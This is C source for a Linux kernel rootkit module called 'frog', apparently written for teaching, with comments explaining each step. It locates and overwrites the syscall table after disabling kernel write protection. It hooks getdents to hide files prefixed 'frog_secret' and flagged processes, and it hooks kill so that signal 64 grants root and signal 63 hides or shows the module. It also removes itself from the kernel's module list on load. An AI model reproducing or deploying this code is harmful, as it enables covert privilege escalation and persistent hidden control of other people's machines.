#define START_MEM	PAGE_OFFSET
#define END_MEM		ULONG_MAX
#define MAGIC_PREFIX 	"frog_secret"
#define PF_INVISIBLE 	0x10000000
#define MODULE_NAME 	"frog"

#include <asm/uaccess.h>
#include <linux/sched.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/version.h> 
#include <linux/proc_fs.h>
#include <linux/fdtable.h>


struct linux_dirent {
        unsigned long   d_ino; 		// Inode number
        unsigned long   d_off; 		// Offset to next linux_dirent
        unsigned short  d_reclen;	// Size of this entire linux_dirent
        char            d_name[1]; 	// Filename
};

enum {
	SIGSUPER = 64,
	SIGMODINVIS = 63,
};

unsigned long cr0;
static unsigned long *sys_call_table;
typedef asmlinkage int (*orig_getdents_t)(unsigned int, struct linux_dirent *,
	unsigned int);
typedef asmlinkage int (*orig_getdents64_t)(unsigned int,
	struct linux_dirent64 *, unsigned int);
typedef asmlinkage int (*orig_kill_t)(pid_t, int);
orig_getdents_t orig_getdents;
orig_kill_t orig_kill;

// sys_call_table is no longer exported in linux 2.6, use brute force to find it
// Dynamically obtain the syscall table address by scannig through the kernel memory
// In linux 64bit, PAGE_OFFSET and ULONG_LAX are constants with values that are equal to the 
// start and end addresses of the kernel memory 
unsigned long* get_syscall_table_bf(void){
	unsigned long *syscall_table;
	unsigned long int i;

	for (i = PAGE_OFFSET; i < ULONG_MAX; i += sizeof(void *)) {
		syscall_table = (unsigned long *)i;
		// sys_close is used as a reference point, can choose other point too
		if (syscall_table[__NR_close] == (unsigned long)sys_close)
			return syscall_table;
	}
	return NULL;
}

// return the task_struct of the given pid
// the kernel stores the list of processes in a circular doubly linked list called the task list
// each element in the task list is a process descriptor of the type task_struct
struct task_struct* find_task(pid_t pid){
	struct task_struct *p = current;
	// Iterates over the entire task list, starting from the current process
	for_each_process(p) {
		if (p->pid == pid)
			return p;
	}
	return NULL;
}

// return true if the process is invisible
int is_invisible(pid_t pid){
	struct task_struct *task;
	if (!pid)
		return 0;
	task = find_task(pid);
	if (!task)
		return 0;
	if (task->flags & PF_INVISIBLE)
		return 1;
	return 0;
}


asmlinkage int hacked_getdents(unsigned int fd, struct linux_dirent __user *dirent,
unsigned int count){
	// read from fd into dirent which has size count
	// ret is the number of bytes read
	int ret = orig_getdents(fd, dirent, count), err;
	unsigned short proc = 0;
	unsigned long off = 0;
	struct linux_dirent *dir, *kdirent, *prev = NULL;
	struct inode *d_inode;

	if (ret <= 0)
		return ret;	
	// allocate size of ret memory and initialize to zero
	kdirent = kzalloc(ret, GFP_KERNEL);
	if (kdirent == NULL) // allocation fails
		return ret;

	// copy data from dirent to kdirent, "ret" is number of bytes that could not be copied
	err = copy_from_user(kdirent, dirent, ret);
	if (err) // at least one byte cannot be copied
		goto out;

	// current is the pointer to current process
	d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;

	// d_inode is under /proc, and not a device type
	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev))
		proc = 1;

	while (off < ret) {
		dir = (void *)kdirent + off;
		// not under /proc but dir name starts with magic_prefix
		if ((!proc && (memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0))
		// or under /proc and the process is invisible
		||   (proc && is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
			// only in the first round of loop, prev is still NULL
			if (dir == kdirent) {
				// reduces the number of total files/direntry size
				ret -= dir->d_reclen;
				// copies ret# bytes from dir+dir->d_reclen to dir
				// move up the next dir entry
				memmove(dir, (void *)dir + dir->d_reclen, ret);
				continue;
			}
			// enlarge the prev dir size
			prev->d_reclen += dir->d_reclen;
		} else 
			prev = dir;

		off += dir->d_reclen;
	} // while loop

	// copy the modified direntries back
	err = copy_to_user(dirent, kdirent, ret);
	if (err)
		goto out;
out:
	kfree(kdirent);
	return ret;
}

// This function alters the current process's credentials  to gain root priviledge
void give_root(void){
	struct cred *newcreds;
	// prepare a new set of task credentials for modification
	// locks current->cred_replace_mutex and then allocates ad constructs a duplicate
	// of the current process's credentials
	newcreds = prepare_creds();
	
	// returns with the mutex still held if successful, NULL if not successful
	if (newcreds == NULL)
		return;
	// Set all the id to be 0, which refers to root
	newcreds->uid = newcreds->gid = 0; // user identifier, group identifier
	newcreds->euid = newcreds->egid = 0; // effective user id 
	newcreds->suid = newcreds->sgid = 0; // saved user id
	newcreds->fsuid = newcreds->fsgid = 0; // file system user id
	// install a new set of credentials to the current task
	commit_creds(newcreds);
}

// If we don't do this cleanup, when the kernel unloads the module, it will try to delete
// entry in /sys/module for that module. But we just removed it, so the kernel will try to 
// removes some non-existing entry, which can cause the system to crash.
// So by setting this pointer to NULL, the kernel will not try to remove the module
static inline void tidy(void){
	kfree(THIS_MODULE->sect_attrs);
	THIS_MODULE->sect_attrs = NULL;
}

static struct list_head *module_previous;
static short module_hidden = 0;


void module_show(void){
	// THIS_MODULE is a linux defined macro, referring to the module we are writting
	// use linux list_add function to add itself to the kernel task list, after module_previous
	list_add(&THIS_MODULE->list, module_previous);
	module_hidden = 0;
}

void module_hide(void){
	module_previous = THIS_MODULE->list.prev;
	// use linux list_del function to remove itself from the kernel task lsit
	list_del(&THIS_MODULE->list);
	module_hidden = 1;
}

asmlinkage int hacked_kill(pid_t pid, int sig){
	struct task_struct *task;

	switch (sig) {
		case SIGSUPER:
			give_root();
			break;
		case SIGMODINVIS:
			if (module_hidden) module_show();
			else module_hide();
			break;
		default:
			return orig_kill(pid, sig);
	}
	return 0;
}

// recover the protection mode
static inline void protect_memory(void){
	write_cr0(cr0);
}

// perform the bit operation to set the WP bit to be zero
// to disable the protected mode, bypass the kernel write protection
static inline void unprotect_memory(void){
	write_cr0(cr0 & ~0x00010000);
}

static int __init frog_init(void){
	sys_call_table = get_syscall_table_bf();
	if (!sys_call_table)
		return -1;
	
	// read_cr0 linux function returns the value of the register cr0 (control register)
	// save the control register value
	cr0 = read_cr0();
	
	// hide itself from the very beginning
	module_hide();
	tidy();

	// save the original syscall table entries
	orig_getdents = (orig_getdents_t)sys_call_table[__NR_getdents];
	orig_kill = (orig_kill_t)sys_call_table[__NR_kill];

	// bypass kernel write protection
	unprotect_memory();
	sys_call_table[__NR_getdents] = (unsigned long)hacked_getdents;
	sys_call_table[__NR_kill] = (unsigned long)hacked_kill;
	// restore kernel write protection
	protect_memory();

	return 0;
}


// Restore the syscall table entries
static void __exit frog_cleanup(void){
	unprotect_memory();
	sys_call_table[__NR_getdents] = (unsigned long)orig_getdents;
	sys_call_table[__NR_kill] = (unsigned long)orig_kill;
	protect_memory();
}

module_init(frog_init);
module_exit(frog_cleanup);

